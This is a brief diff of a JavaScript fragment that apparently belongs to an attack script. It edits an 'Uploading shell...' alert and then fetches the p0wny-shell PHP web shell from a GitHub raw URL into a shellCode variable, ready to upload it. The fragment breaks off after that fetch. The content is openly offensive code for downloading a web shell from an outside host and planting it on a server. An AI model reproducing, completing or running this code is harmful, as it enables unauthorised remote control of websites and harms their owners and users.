@@ -1,4 +1,4 @@
-alert("Uploading external shell...");
+alert("Uploading shell...");
 (async () => {
   const res = await fetch("https://raw.githubusercontent.com/flozz/p0wny-shell/refs/heads/master/shell.php");
   const shellCode = await res.text();
